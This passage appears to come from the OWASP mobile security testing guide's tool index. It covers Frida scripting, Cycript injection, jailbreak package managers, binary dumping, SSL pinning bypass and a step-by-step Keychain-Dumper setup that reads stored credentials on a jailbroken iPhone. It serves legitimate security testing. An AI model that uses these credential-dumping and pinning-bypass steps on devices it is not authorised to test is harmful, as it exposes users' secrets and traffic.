below:</p> <pre><code># python3 frida_python_send.py\nimport frida\n\nsession = frida.get_usb_device().attach('com.android.chrome')\n\n# 1. we want to store method names inside a list\nandroid_view_methods = []\n\nsource = \"\"\"\nJava.perform(function () {\n    var view = Java.use(\"android.view.View\");\n    var methods = view.class.getMethods();\n    for(var i = 0; i &lt; methods.length; i++) {\n        send(methods[i].toString());\n    }\n});\n\"\"\"\n\nscript = session.create_script(source)\n\n# 2. this is a callback function, only method names containing \"Text\" will be appended to the list\ndef on_message(message, data):\n    if \"Text\" in message['payload']:\n        android_view_methods.append(message['payload'])\n\n# 3. we tell the script to run our callback each time a message is received\nscript.on('message', on_message)\n\nscript.load()\n\n# 4. we do something with the collected data, in this case we just print it\nfor method in android_view_methods:\n    print(method)\n\nsession.detach()\n</code></pre> <p>This effectively filters the methods and prints only the ones containing the string \"Text\":</p> <pre><code>$ python3 frida_python_send.py\npublic boolean android.view.View.canResolveTextAlignment()\npublic boolean android.view.View.canResolveTextDirection()\npublic void android.view.View.setTextAlignment(int)\npublic void android.view.View.setTextDirection(int)\npublic void android.view.View.setTooltipText(java.lang.CharSequence)\n...\n</code></pre> <p>In the end, it is up to you to decide where would you like to work with the data. Sometimes it will be more convenient to do it from JavaScript and in other cases Python will be the best choice. Of course you can also send messages from Python to JavaScript by using <code>script.post</code>. Refer to the Frida docs for more information about sending and receiving messages.</p>","tags":["ios","tool"]},{"location":"MASTG/tools/ios/MASTG-TOOL-0040/","title":"MASTG-TOOL-0040: MobSF for iOS","text":"<p>  By running MobSF locally on a macOS host you'll benefit from a slightly better class-dump output.</p> <p>Once you have MobSF up and running you can open it in your browser by navigating to http://127.0.0.1:8000. Simply drag the IPA you want to analyze into the upload area and MobSF will start its job.</p> <p>After MobSF is done with its analysis, you will receive a one-page overview of all the tests that were executed. The page is split up into multiple sections giving some first hints on the attack surface of the application.</p> <p></p> <p>The following is displayed:</p> <ul> <li>Basic information about the app and its binary file.</li> <li>Some options to:<ul> <li>View the <code>Info.plist</code> file.</li> <li>View the strings contained in the app binary.</li> <li>Download a class-dump, if the app was written in Objective-C; if it is written in Swift no class-dump can be created.</li> </ul> </li> <li>List all Purpose Strings extracted from the <code>Info.plist</code> which give some hints on the app's permissions.</li> <li>Exceptions in the App Transport Security (ATS) configuration will be listed.</li> <li>A brief binary analysis showing if free binary security features are activated or e.g. if the binary makes use of banned APIs.</li> <li>List of libraries used by the app binary and list of all files inside the unzipped IPA.</li> </ul> <p>In contrast to the Android use case, MobSF does not offer any dynamic analysis features for iOS apps.</p> <p>Refer to MobSF documentation for more details.</p>","tags":["ios","tool"]},{"location":"MASTG/tools/ios/MASTG-TOOL-0041/","title":"MASTG-TOOL-0041: nm - iOS","text":"<p>nm is a tool that displays the name list (symbol table) of the given binary. You can find here more information for for iOS.</p>","tags":["ios","tool"]},{"location":"MASTG/tools/ios/MASTG-TOOL-0042/","title":"MASTG-TOOL-0042: BinaryCookieReader","text":"<p>  A tool to dump all the cookies from the binary Cookies.binarycookies file - https://github.com/as0ler/BinaryCookieReader/blob/master/BinaryCookieReader.py</p>","tags":["ios","tool"]},{"location":"MASTG/tools/ios/MASTG-TOOL-0043/","title":"MASTG-TOOL-0043: class-dump","text":"<p>class-dump by Steve Nygard is a command line utility for examining the Objective-C runtime information stored in Mach-O (Mach object) files. It generates declarations for the classes, categories, and protocols.</p>","tags":["ios","tool"]},{"location":"MASTG/tools/ios/MASTG-TOOL-0044/","title":"MASTG-TOOL-0044: class-dump-z","text":"<p>class-dump-z is class-dump re-written from scratch in C++, avoiding the use of dynamic calls. Removing these unnecessary calls makes class-dump-z nearly 10 times faster than its predecessor.</p>","tags":["ios","tool"]},{"location":"MASTG/tools/ios/MASTG-TOOL-0045/","title":"MASTG-TOOL-0045: class-dump-dyld","text":"<p> class-dump-dyld by Elias Limneos allows symbols to be dumped and retrieved directly from the shared cache, eliminating the necessity of extracting the files first. It can generate header files from app binaries, libraries, frameworks, bundles, or the whole dyld_shared_cache. Directories or the entirety of dyld_shared_cache can be recursively mass-dumped.</p>","tags":["ios","tool"]},{"location":"MASTG/tools/ios/MASTG-TOOL-0046/","title":"MASTG-TOOL-0046: Cycript","text":"<p>Deprecated Tool</p> <p>This tool is deprecated and should not be used anymore.</p> <p>Reason: Cycript is no longer actively maintained and fails on modern iOS versions. It last saw meaningful updates between 2009 and 2013. Key components like cynject broke on iOS 12 around 2019 due to changes in Cydia Substrate and have not been fixed. Frida offers broader compatibility, active support, and more powerful dynamic instrumentation capabilities.</p> <p>Use instead:</p> <ul> <li> Frida for iOS</li> </ul> <p>Cycript is a scripting language developed by Jay Freeman (aka Saurik). It injects a JavaScriptCore virtual machine into a running process. Using the Cycript interactive console, users can manipulate the process with a hybrid Objective-C++ and JavaScript syntax. Accessing and instantiating Objective-C classes inside a running process is supported. Cycript can be injected into a running process, similar to a debugger, using Cydia Substrate, which is the standard framework for developing  Cydia runtime patches known as Cydia Substrate Extensions on iOS. It includes Cynject, a tool that provides code injection support for Cycript.</p> <p>In order to install Cycript, first download, unpack, and install the SDK.</p> <pre><code>#on iphone\n$ wget https://cydia.saurik.com/api/latest/3 -O cycript.zip &amp;&amp; unzip cycript.zip\n$ sudo cp -a Cycript.lib/*.dylib /usr/lib\n$ sudo cp -a Cycript.lib/cycript-apl /usr/bin/cycript\n</code></pre> <p>To spawn the interactive Cycript shell, run \"./cycript\" or \"cycript\" if Cycript is on your path.</p> <pre><code>$ cycript\ncy#\n</code></pre> <p>To inject into a running process, we first need to find the process ID (PID). Run the application and make sure the app is in the foreground. Running <code>cycript -p &lt;PID&gt;</code> injects Cycript into the process. To illustrate, we will inject into SpringBoard (which is always running).</p> <pre><code>$ ps -ef | grep SpringBoard\n501 78 1 0 0:00.00 ?? 0:10.57 /System/Library/CoreServices/SpringBoard.app/SpringBoard\n$ ./cycript -p 78\ncy#\n</code></pre> <p>One of the first things you can try out is to get the application instance (<code>UIApplication</code>), you can use Objective-C syntax:</p> <pre><code>cy# [UIApplication sharedApplication]\ncy# var a = [UIApplication sharedApplication]\n</code></pre> <p>Use that variable now to get the application's delegate class:</p> <pre><code>cy# a.delegate\n</code></pre> <p>Let's try to trigger an alert message on SpringBoard with Cycript.</p> <pre><code>cy# alertView = [[UIAlertView alloc] initWithTitle:@\"OWASP MASTG\" message:@\"Mobile Application Security Testing Guide\"  delegate:nil cancelButtonitle:@\"OK\" otherButtonTitles:nil]\n#\"&lt;UIAlertView: 0x1645c550; frame = (0 0; 0 0); layer = &lt;CALayer: 0x164df160&gt;&gt;\"\ncy# [alertView show]\ncy# [alertView release]\n</code></pre> <p></p> <p>Find the app's document directory with Cycript:</p> <pre><code>cy# [[NSFileManager defaultManager] URLsForDirectory:NSDocumentDirectory inDomains:NSUserDomainMask][0]\n#\"file:///var/mobile/Containers/Data/Application/A8AE15EE-DC8B-4F1C-91A5-1FED35212DF/Documents/\"\n</code></pre> <p>The command <code>[[UIApp keyWindow] recursiveDescription].toString()</code> returns the view hierarchy of <code>keyWindow</code>. The description of every subview and sub-subview of <code>keyWindow</code> is shown. The indentation space reflects the relationships between views. For example, <code>UILabel</code>, <code>UITextField</code>, and <code>UIButton</code> are subviews of <code>UIView</code>.</p> <pre><code>cy# [[UIApp keyWindow] recursiveDescription].toString()\n`&lt;UIWindow: 0x16e82190; frame = (0 0; 320 568); gestureRecognizers = &lt;NSArray: 0x16e80ac0&gt;; layer = &lt;UIWindowLayer: 0x16e63ce0&gt;&gt;\n  | &lt;UIView: 0x16e935f0; frame = (0 0; 320 568); autoresize = W+H; layer = &lt;CALayer: 0x16e93680&gt;&gt;\n  |    | &lt;UILabel: 0x16e8f840; frame = (0 40; 82 20.5); text = 'i am groot!'; hidden = YES; opaque = NO; autoresize = RM+BM; userInteractionEnabled = NO; layer = &lt;_UILabelLayer: 0x16e8f920&gt;&gt;\n  |    | &lt;UILabel: 0x16e8e030; frame = (0 110.5; 320 20.5); text = 'A Secret Is Found In The ...'; opaque = NO; autoresize = RM+BM; userInteractionEnabled = NO; layer = &lt;_UILabelLayer: 0x16e8e290&gt;&gt;\n  |    | &lt;UITextField: 0x16e8fbd0; frame = (8 141; 304 30); text = ''; clipsToBounds = YES; opaque = NO; autoresize = RM+BM; gestureRecognizers = &lt;NSArray: 0x16e94550&gt;; layer = &lt;CALayer: 0x16e8fea0&gt;&gt;\n  |    |    | &lt;_UITextFieldRoundedRectBackgroundViewNeue: 0x16e92770; frame = (0 0; 304 30); opaque = NO; autoresize = W+H; userInteractionEnabled = NO; layer = &lt;CALayer: 0x16e92990&gt;&gt;\n  |    | &lt;UIButton: 0x16d901e0; frame = (8 191; 304 30); opaque = NO; autoresize = RM+BM; layer = &lt;CALayer: 0x16d90490&gt;&gt;\n  |    |    | &lt;UIButtonLabel: 0x16e72b70; frame = (133 6; 38 18); text = 'Verify'; opaque = NO; userInteractionEnabled = NO; layer = &lt;_UILabelLayer: 0x16e974b0&gt;&gt;\n  |    | &lt;_UILayoutGuide: 0x16d92a00; frame = (0 0; 0 20); hidden = YES; layer = &lt;CALayer: 0x16e936b0&gt;&gt;\n  |    | &lt;_UILayoutGuide: 0x16d92c10; frame = (0 568; 0 0); hidden = YES; layer = &lt;CALayer: 0x16d92cb0&gt;&gt;`\n</code></pre> <p>You can also use Cycript's built-in functions such as <code>choose</code> which searches the heap for instances of the given Objective-C class:</p> <pre><code>cy# choose(SBIconModel)\n[#\"&lt;SBIconModel: 0x1590c8430&gt;\"]\n</code></pre> <p>Learn more in the Cycript Manual.</p>","tags":["ios","tool","deprecated"]},{"location":"MASTG/tools/ios/MASTG-TOOL-0047/","title":"MASTG-TOOL-0047: Cydia","text":"<p>Deprecated Tool</p> <p>This tool is deprecated and should not be used anymore.</p> <p>Reason: Modern Jailbreaks like Dopamine and palera1n use more modern package managers like Sileo and Zebra. Cydia has not received any meaningful update since iOS 14 and is no longer relevant on modern jailbreaks.</p> <p>Use instead:</p> <ul> <li> Sileo</li> </ul> <p>Cydia is an alternative app store developed by Jay Freeman (aka \"saurik\") for jailbroken devices. It provides a graphical user interface and a version of the Advanced Packaging Tool (APT). You can easily access many \"unsanctioned\" app packages through Cydia. Most jailbreaks install Cydia automatically.</p> <p>Many tools on a jailbroken device can be installed by using Cydia, which is the unofficial AppStore for iOS devices and allows you to manage repositories. In Cydia you should add (if not already done by default) the following repositories by navigating to Sources -&gt; Edit, then clicking Add in the top left:</p> <ul> <li>http://apt.thebigboss.org/repofiles/cydia/: One of the most popular repositories is BigBoss, which contains various packages, such as the BigBoss Recommended Tools package.</li> <li>https://build.frida.re: Install Frida by adding the repository to Cydia.</li> <li>https://repo.chariz.io: Useful when managing your jailbreak on iOS 11.</li> <li>https://apt.bingner.com/: Another repository, with quiet a few good tools, is Elucubratus, which gets installed when you install Cydia on iOS 12 using Unc0ver.</li> </ul> <p>In case you are using the Sileo App Store, please keep in mind that the Sileo Compatibility Layer shares your sources between Cydia and Sileo, however, Cydia is unable to remove sources added in Sileo, and Sileo is unable to remove sources added in Cydia. Keep this in mind when you're trying to remove sources.</p> <p>After adding all the suggested repositories above you can install the following useful packages from Cydia to get started:</p> <ul> <li>adv-cmds: Advanced command line, which includes tools such as finger, fingerd, last, lsvfs, md, and ps.</li> <li>AppList: Allows developers to query the list of installed apps and provides a preference pane based on the list.</li> <li>Apt: Advanced Package Tool, which you can use to manage the installed packages similarly to DPKG, but in a more friendly way. This allows you to install, uninstall, upgrade, and downgrade packages from your Cydia repositories. Comes from Elucubratus.</li> <li>AppSync Unified: Allows you to sync and install unsigned iOS applications.</li> <li>BigBoss Recommended Tools: Installs many useful command line tools for security testing including standard Unix utilities that are missing from iOS, including wget, unrar, less, and sqlite3 client.</li> <li>class-dump: A command line tool for examining the Objective-C runtime information stored in Mach-O files and generating header files with class interfaces.</li> <li>class-dump-z: A command line tool for examining the Swift runtime information stored in Mach-O files and generating header files with class interfaces. This is not available via Cydia, therefore please refer to installation steps in order to get class-dump-z running on your iOS device. Note that class-dump-z is not maintained and does not work well with Swift. It is recommended to use  dsdump instead.</li> <li>Clutch: Used to decrypt an app executable.</li> <li>Cycript: Is an inlining, optimizing, Cycript-to-JavaScript compiler and immediate-mode console environment that can be injected into running processes (associated to Substrate).</li> <li>Cydia Substrate: A platform that makes developing third-party iOS add-ons easier via dynamic app manipulation or introspection.</li> <li>cURL: Is a well known http client which you can use to download packages faster to your device. This can be a great help when you need to install different versions of Frida-server on your device for instance.</li> <li>Darwin CC Tools: A useful set of tools like nm, and strip that are capable of auditing mach-o files.</li> <li>IPA Installer Console: Tool for installing IPA application packages from the command line. After installing two commands will be available <code>installipa</code> and <code>ipainstaller</code> which are both the same.</li> <li>Frida: An app you can use for dynamic instrumentation. Please note that Frida has changed its implementation of its APIs over time, which means that some scripts might only work with specific versions of the Frida-server (which forces you to update/downgrade the version also on macOS). Running Frida Server installed via APT or Cydia is recommended. Upgrading/downgrading afterwards can be done, by following the instructions of this Github issue.</li> <li>Grep: Handy tool to filter lines.</li> <li>Gzip: A well known ZIP utility.</li> <li>PreferenceLoader: A Substrate-based utility that allows developers to add entries to the Settings application, similar to the SettingsBundles that App Store apps use.</li> <li>SOcket CAT: a utility with which you can connect to sockets to read and write messages. This can come in handy if you want to trace the syslog on iOS 12 devices.</li> </ul> <p>Besides Cydia you can also ssh into your iOS device and you can install the packages directly via apt-get, like for example adv-cmds.</p> <pre><code>apt-get update\napt-get install adv-cmds\n</code></pre>","tags":["ios","tool","deprecated"]},{"location":"MASTG/tools/ios/MASTG-TOOL-0048/","title":"MASTG-TOOL-0048: dsdump","text":"<p> dsdump is a tool to dump Objective-C classes and Swift type descriptors (classes, structs, enums). It only supports Swift version 5 or higher and does not support ARM 32-bit binaries.</p> <p>The following example shows how you can dump Objective-C classes and Swift type descriptors of an iOS application.</p> <p>First verify if the app's main binary is a FAT binary containing ARM64:</p> <pre><code>$ otool -hv [APP_MAIN_BINARY_FILE]\nMach header\n      magic cputype cpusubtype  caps    filetype ncmds sizeofcmds      flags\n   MH_MAGIC     ARM         V7  0x00     EXECUTE    39       5016   NOUNDEFS DYLDLINK TWOLEVEL PIE\nMach header\n      magic cputype cpusubtype  caps    filetype ncmds sizeofcmds      flags\nMH_MAGIC_64   ARM64        ALL  0x00     EXECUTE    38       5728   NOUNDEFS DYLDLINK TWOLEVEL PIE\n</code></pre> <p>If yes, then we specify the \"--arch\" parameter to \"arm64\", otherwise it is not needed if the binary only contains an ARM64 binary.</p> <pre><code># Dump the Objective-C classes to a temporary file\n$ dsdump --objc --color --verbose=5 --arch arm64 --defined [APP_MAIN_BINARY_FILE] &gt; /tmp/OBJC.txt\n\n# Dump the Swift type descriptors to a temporary file if the app is implemented in Swift\n$ dsdump --swift --color --verbose=5 --arch arm64 --defined [APP_MAIN_BINARY_FILE] &gt; /tmp/SWIFT.txt\n</code></pre> <p>You can find more information about the inner workings of dsdump and how to programmatically inspect a Mach-O binary to display the compiled Swift types and Objective-C classes in this article.</p>","tags":["ios","tool"]},{"location":"MASTG/tools/ios/MASTG-TOOL-0049/","title":"MASTG-TOOL-0049: Frida-cycript","text":"<p>  A fork of Cycript including a brand new runtime called Mj\u00f8lner powered by Frida. This enables frida-cycript to run on all the platforms and architectures maintained by frida-core - https://github.com/nowsecure/frida-cycript</p>","tags":["ios","tool"]},{"location":"MASTG/tools/ios/MASTG-TOOL-0050/","title":"MASTG-TOOL-0050: Frida-ios-dump","text":"<p> Frida-ios-dump is a Python script that helps you retrieve the decrypted version of an iOS app (IPA) from an iOS device. It supports both Python 2 and Python 3 and requires Frida running on your iOS device (jailbroken or not). This tool uses Frida's Memory API to dump the memory of the running app and recreate an IPA file. Because the code is extracted from memory, it is automatically decrypted.</p>","tags":["ios","tool"]},{"location":"MASTG/tools/ios/MASTG-TOOL-0050/#alternatives","title":"Alternatives","text":"<p>Bagbak is a Node.js script that decrypts the entire application, including its extensions. It serves the same purpose as frida-ios-dump, but you might find it easier to set up and more convenient for regular use.</p>","tags":["ios","tool"]},{"location":"MASTG/tools/ios/MASTG-TOOL-0051/","title":"MASTG-TOOL-0051: gdb","text":"<p>A tool to perform runtime analysis of iOS applications - https://cydia.radare.org/pool/main/g/gdb/</p>","tags":["ios","tool"]},{"location":"MASTG/tools/ios/MASTG-TOOL-0053/","title":"MASTG-TOOL-0053: iOSbackup","text":"<p> <code>iOSbackup</code> is a Python 3 class that reads and extracts files from a password-encrypted iOS backup created by iTunes on Mac and Windows.</p>","tags":["ios","tool"]},{"location":"MASTG/tools/ios/MASTG-TOOL-0054/","title":"MASTG-TOOL-0054: ios-deploy","text":"<p>  With ios-deploy you can install and debug iOS apps from the command line, without using Xcode. It can be installed via brew on macOS:</p> <pre><code>brew install ios-deploy\n</code></pre> <p>Alternatively:</p> <pre><code>git clone https://github.com/ios-control/ios-deploy.git\ncd ios-deploy/\nxcodebuild\ncd build/Release\n./ios-deploy\nln -s &lt;your-path-to-ios-deploy&gt;/build/Release/ios-deploy /usr/local/bin/ios-deploy\n</code></pre> <p>The last line creates a symbolic link and makes the executable available system-wide. Reload your shell to make the new commands available:</p> <pre><code>zsh: # . ~/.zshrc\nbash: # . ~/.bashrc\n</code></pre>","tags":["ios","tool"]},{"location":"MASTG/tools/ios/MASTG-TOOL-0055/","title":"MASTG-TOOL-0055: iproxy","text":"<p> <code>iproxy</code> allows you to forward a port from a connected iOS device to a port on the host machine. This can be useful for interacting with jailbroken devices, as some jailbreaks do not expose the SSH port on the public interface. With <code>iproxy</code>, the SSH port can be forwarded over USB to the host, allowing you to still connect to it.</p> <p>Warning</p> <p>While many package repositories (apt, brew, cargo, ...) have versions of libimobiledevice tools, they are often outdated. We recommend compiling the different tools from source for the best results.</p>","tags":["ios","tool"]},{"location":"MASTG/tools/ios/MASTG-TOOL-0056/","title":"MASTG-TOOL-0056: Keychain-Dumper","text":"<p> Keychain-dumper is an iOS tool to check which keychain items are available to an attacker once an iOS device has been jailbroken. In order to use the tool on modern versions of iOS, you need to follow a few steps. First, download the latest release from the Keychain-Dumper releases page, and unzip the package. Next, download the updateEntitlements.sh script to the same directory. Modify the first line (<code>KEYCHAIN_DUMPER_FOLDER=/usr/bin</code>) to say <code>KEYCHAIN_DUMPER_FOLDER=/var/jb/usr/bin</code> to be compatible with rootless jailbreaks. If your device has a rooted jailbreak (e.g. palera1n) you can skip this step.</p> <pre><code># Copy over the binary to /var/jb/usr/bin/\nscp keychain_dumper mobile@&lt;deviceip&gt;:/var/jb/usr/bin/\n\n# Copy over the updateEntitlements.sh script\nscp updateEntitlements.sh mobile@&lt;deviceip&gt;:/var/jb/usr/bin/\n\n# SSH into the device\nssh mobile@&lt;deviceip&gt;\n\n# Go to the /var/jb/tmp directory and switch to root\ncd /var/jb/usr/bin &amp; sudo su\n\n# Add executable permissions to both files\nchmod +x keychain_dumper\nchmod +x updateEntitlements.sh\n\n# Run updateEntitlements.sh\n./updateEntitlements.sh\n\n# Run keychain_dumper\n/var/jb/tmp/keychain_dump -h\n</code></pre> <p>By default, the script will give keychain_dump all the required entitlements to analyze the KeyChain for all installed applications. To focus on a single application, you can remove all unnecessary requirements:</p> <pre><code># Extract entitlements\nldid -e /var/jb/tmp/keychain_dump &gt; ent.xml\n\n# Remove all non-needed entitlements from the &lt;array&gt; segment\nnano ent.xml\n\n# Assign the entitlements again\nldid -Sent.xml /var/jb/tmp/keychain_dump\n</code></pre> <p>For usage instructions please refer to the Keychain-dumper GitHub page.</p>","tags":["ios","tool"]},{"location":"MASTG/tools/ios/MASTG-TOOL-0057/","title":"MASTG-TOOL-0057: lldb","text":"<p>A debugger by Apple's Xcode used for debugging iOS applications - https://lldb.llvm.org/</p>","tags":["ios","tool"]},{"location":"MASTG/tools/ios/MASTG-TOOL-0058/","title":"MASTG-TOOL-0058: MachoOView","text":"<p>MachoOView is a useful visual Mach-O file browser that also allows in-file editing of ARM binaries.</p>","tags":["ios","tool"]},{"location":"MASTG/tools/ios/MASTG-TOOL-0059/","title":"MASTG-TOOL-0059: optool","text":"<p> optool is a tool which interfaces with MachO binaries in order to insert/remove load commands, strip code signatures, resign, and remove aslr.</p> <p>To install it:</p> <pre><code>git clone https://github.com/alexzielenski/optool.git\ncd optool/\ngit submodule update --init --recursive\nxcodebuild\nln -s &lt;your-path-to-optool&gt;/build/Release/optool /usr/local/bin/optool\n</code></pre> <p>The last line creates a symbolic link and makes the executable available system-wide. Reload your shell to make the new commands available:</p> <pre><code>zsh: # . ~/.zshrc\nbash: # . ~/.bashrc\n</code></pre>","tags":["ios","tool"]},{"location":"MASTG/tools/ios/MASTG-TOOL-0060/","title":"MASTG-TOOL-0060: otool","text":"<p>otool is a tool for displaying specific parts of object files or libraries. It works with Mach-O files and universal file formats.</p>","tags":["ios","tool"]},{"location":"MASTG/tools/ios/MASTG-TOOL-0061/","title":"MASTG-TOOL-0061: Grapefruit","text":"<p> Grapefruit is an iOS app assessment tool that is using the Frida server on the iOS device and is abstracting many penetration testing tasks into a Web UI. It can be installed via <code>npm</code>.</p> <pre><code>$ npm install -g igf\n$ grapefruit\nlistening on http://localhost:31337\n</code></pre> <p>When you execute the command <code>grapefruit</code> a local server will be started on port 31337. Connect your jailbroken device with the Frida server running, or a non-jailbroken device with a repackaged app including Frida to your machine via USB. Once you click on the \"iPhone\" icon you will get an overview of all installed apps.</p> <p>With Grapfruit it's possible to explore different kinds of information concerning an iOS app. Once you selected the iOS app you can perform many tasks such as:</p> <ul> <li>Get information about the binary</li> <li>View folders and files used by the application and download them</li> <li>Inspect the Info.plist</li> <li>Get a UI Dump of the app screen shown on the iOS device</li> <li>List the modules that are loaded by the app</li> <li>Dump class names</li> <li>Dump keychain items</li> </ul>","tags":["ios","tool"]},{"location":"MASTG/tools/ios/MASTG-TOOL-0062/","title":"MASTG-TOOL-0062: Plutil","text":"<p>A program that can convert .plist files between a binary version and an XML version - https://www.theiphonewiki.com/wiki/Plutil</p>","tags":["ios","tool"]},{"location":"MASTG/tools/ios/MASTG-TOOL-0063/","title":"MASTG-TOOL-0063: security","text":"<p><code>security</code> is a macOS command to administer Keychains, keys, certificates and the Security framework.</p>","tags":["ios","tool"]},{"location":"MASTG/tools/ios/MASTG-TOOL-0064/","title":"MASTG-TOOL-0064: Sileo","text":"<p> Sileo is a third-party app store available for both rooted and rootless jailbreaks on iOS 12+. It provides a graphical user interface around <code>apt/dpkg</code> and allows you to install apps, binaries and tweaks. Sileo is packaged with popular jailbreaks such as Dopamine and palera1n.</p> <p>Installing apps</p> <p>Installing applications via Sileo or any other third-party app store entails risks, as the applications are not validated by Apple. Be careful with installing unknown applications.</p> <p>Many tools on a jailbroken device can be installed by using Sileo. By default, Sileo will already have some package repositories configured. You can add new repositories by navigating to Sources -&gt; Edit, then clicking Add in the top left.</p> <p>Some useful tools that can be installed this way:</p> <ul> <li> Frida for iOS</li> <li> SSL Kill Switch 3</li> <li> GlobalWebInspect</li> <li> AppSync Unified</li> </ul> <p></p>","tags":["ios","tool"]},{"location":"MASTG/tools/ios/MASTG-TOOL-0065/","title":"MASTG-TOOL-0065: simctl","text":"<p>simctl is an Xcode tool that allows you to interact with iOS simulators via the command line to e.g. manage simulators, launch apps, take screenshots or collect their logs.</p>","tags":["ios","tool"]},{"location":"MASTG/tools/ios/MASTG-TOOL-0066/","title":"MASTG-TOOL-0066: SSL Kill Switch 3","text":"<p>  Blackbox tool to disable SSL certificate validation - including certificate pinning - within iOS and macOS Apps - https://github.com/NyaMisty/ssl-kill-switch3</p>","tags":["ios","tool"]},{"location":"MASTG/tools/ios/MASTG-TOOL-0067/","title":"MASTG-TOOL-0067: swift-demangle","text":"<p>swift-demangle is an Xcode tool that demangles Swift symbols. For more information run <code>xcrun swift-demangle -help</code> once installed.</p>","tags":["ios","tool"]},{"location":"MASTG/tools/ios/MASTG-TOOL-0068/","title":"MASTG-TOOL-0068: SwiftShield","text":"<p> SwiftShield is a tool that generates irreversible, encrypted names for your iOS project's objects (including your Pods and Storyboards). This raises the bar for reverse engineers and will produce less helpful output when using reverse engineering tools such as class-dump and Frida.</p> <p>Warning: SwiftShield irreversibly overwrites all your source files. Ideally, you should have it run only on your CI server, and on release builds.</p> <p>A sample Swift project is used to demonstrate the usage of SwiftShield.</p> <ul> <li>Check out sushi2k/SwiftSecurity.</li> <li>Open the project in Xcode and make sure that the project is building successfully (Product / Build or Apple-Key + B).</li> <li>Download the latest release of SwiftShield and unzip it.</li> <li>Go to the directory where you downloaded SwiftShield and copy the swiftshield executable to <code>/usr/local/bin</code>:</li> </ul> <pre><code>cp swiftshield/swiftshield /usr/local/bin/\n</code></pre> <ul> <li>In your terminal go into the SwiftSecurity directory (which you checked out in step 1) and execute the command swiftshield (which you downloaded in step 3):</li> </ul> <pre><code>$ cd SwiftSecurity\n$ swiftshield -automatic -project-root . -automatic-project-file SwiftSecurity.xcodeproj -automatic-project-scheme SwiftSecurity\nSwiftShield 3.4.0\nAutomatic mode\nBuilding project to gather modules and compiler arguments...\n-- Indexing ReverseEngineeringToolsChecker.swift --\nFound declaration of ReverseEngineeringToolsChecker (s:13SwiftSecurity30ReverseEngineeringToolsCheckerC)\nFound declaration of amIReverseEngineered (s:13SwiftSecurity30ReverseEngineeringToolsCheckerC20amIReverseEngineeredSbyFZ)\nFound declaration of checkDYLD (s:13SwiftSecurity30ReverseEngineeringToolsCheckerC9checkDYLD33_D6FE91E9C9AEC4D13973F8ABFC1AC788LLSbyFZ)\nFound declaration of checkExistenceOfSuspiciousFiles (s:13SwiftSecurity30ReverseEngineeringToolsCheckerC31checkExistenceOfSuspiciousFiles33_D6FE91E9C9AEC4D13973F8ABFC1AC788LLSbyFZ)\n...\n</code></pre> <p>SwiftShield is now detecting class and method names and is replacing their identifier with an encrypted value.</p> <p>In the original source code you can see all the class and method identifiers:</p> <p></p> <p>SwiftShield was now replacing all of them with encrypted values that leave no trace to their original name or intention of the class/method:</p> <p></p> <p>After executing <code>swiftshield</code> a new directory will be created called <code>swiftshield-output</code>. In this directory another directory is created with a timestamp in the folder name. This directory contains a text file called <code>conversionMap.txt</code>, that maps the encrypted strings to their original values.</p> <pre><code>$ cat conversionMap.txt\n//\n// SwiftShield Conversion Map\n// Automatic mode for SwiftSecurity, 2020-01-02 13.51.03\n// Deobfuscate crash logs (or any text file) by running:\n// swiftshield -deobfuscate CRASH_FILE -deobfuscate_map THIS_FILE\n//\n\nViewController ===&gt; hTOUoUmUcEZUqhVHRrjrMUnYqbdqWByU\nviewDidLoad ===&gt; DLaNRaFbfmdTDuJCPFXrGhsWhoQyKLnO\nsceneDidBecomeActive ===&gt; SUANAnWpkyaIWlGUqwXitCoQSYeVilGe\nAppDelegate ===&gt; KftEWsJcctNEmGuvwZGPbusIxEFOVcIb\nDeny_Debugger ===&gt; lKEITOpOvLWCFgSCKZdUtpuqiwlvxSjx\nButton_Emulator ===&gt; akcVscrZFdBBYqYrcmhhyXAevNdXOKeG\n</code></pre> <p>This is needed for deobfuscating encrypted crash logs.</p> <p>Another example project is available in SwiftShield's Github repo, that can be used to test the execution of SwiftShield.</p>","tags":["ios","tool"]},{"location":"MASTG/tools/ios/MASTG-TOOL-0069/","title":"MASTG-TOOL-0069: Usbmuxd","text":"<p> usbmuxd is a socket daemon that monitors USB iPhone connections. You can use it to map the mobile device's localhost listening sockets to TCP ports on your host computer. This allows you to conveniently SSH into your iOS device without setting up an actual network connection. When usbmuxd detects an iPhone running in normal mode, it connects to the phone and begins relaying requests that it receives via <code>/var/run/usbmuxd</code>.</p>","tags":["ios","tool"]},{"location":"MASTG/tools/ios/MASTG-TOOL-0070/","title":"MASTG-TOOL-0070: Xcode","text":"<p>Xcode is an Integrated Development Environment (IDE) for macOS that contains a suite of tools for developing software for macOS, iOS, watchOS, and tvOS. You can download Xcode for free from the official Apple website. Xcode will offer you different tools and functions to interact with an iOS device that can be helpful during a penetration test, such as analyzing logs or sideloading of apps.</p>","tags":["ios","tool"]},{"location":"MASTG/tools/ios/MASTG-TOOL-0071/","title":"MASTG-TOOL-0071: Xcode Command Line Tools","text":"<p>After installing  Xcode, in order to make all development tools available systemwide, it is recommended to install the Xcode Command Line Tools package. This will be handy during testing of iOS apps as some of the tools (e.g. objection) are also relying on the availability of this package. You can download it from the official Apple website or install it straight away from your terminal:</p> <pre><code>xcode-select --install\n</code></pre>","tags":["ios","tool"]},{"location":"MASTG/tools/ios/MASTG-TOOL-0072/","title":"MASTG-TOOL-0072: xcrun","text":"<p><code>xcrun</code> can be used invoke Xcode developer tools from the command-line, without having them in the path. For example you may want to use it to locate and run swift-demangle or simctl.</p>","tags":["ios","tool"]},{"location":"MASTG/tools/ios/MASTG-TOOL-0073/","title":"MASTG-TOOL-0073: radare2 for iOS","text":"<p> Radare2 is a complete framework for reverse-engineering and analyzing binaries. The installation instructions can be found in the GitHub repository. To learn more on radare2 you may want to read the official radare2 book.</p> <p>Learn more:</p> <ul> <li>r2wiki</li> <li>Loading iOS binaries to radare2</li> <li>GitHub radare2 Docs - iOS</li> </ul>","tags":["ios","tool"]},{"location":"MASTG/tools/ios/MASTG-TOOL-0074/","title":"MASTG-TOOL-0074: objection for iOS","text":"<p>  Objection offers several features specific to iOS. You can find the full list of features on the project's page, but here are a few interesting ones:</p> <ul> <li>Repackage applications to include the Frida gadget</li> <li>Disable SSL pinning for popular methods</li> <li>Access application storage to download or upload files</li> <li>Execute custom Frida scripts</li> <li>Dump the Keychain</li> <li>Read plist files</li> </ul> <p>All these tasks and more can be easily done by using the commands in objection's REPL. For example, you can obtain the classes used in an app, functions of classes or information about the bundles of an app by running:</p> <pre><code>$ ios hooking list classes\n$ ios hooking list class_methods &lt;ClassName&gt;\n$ ios bundles list_bundles\n</code></pre> <p>If you have a jailbroken device with 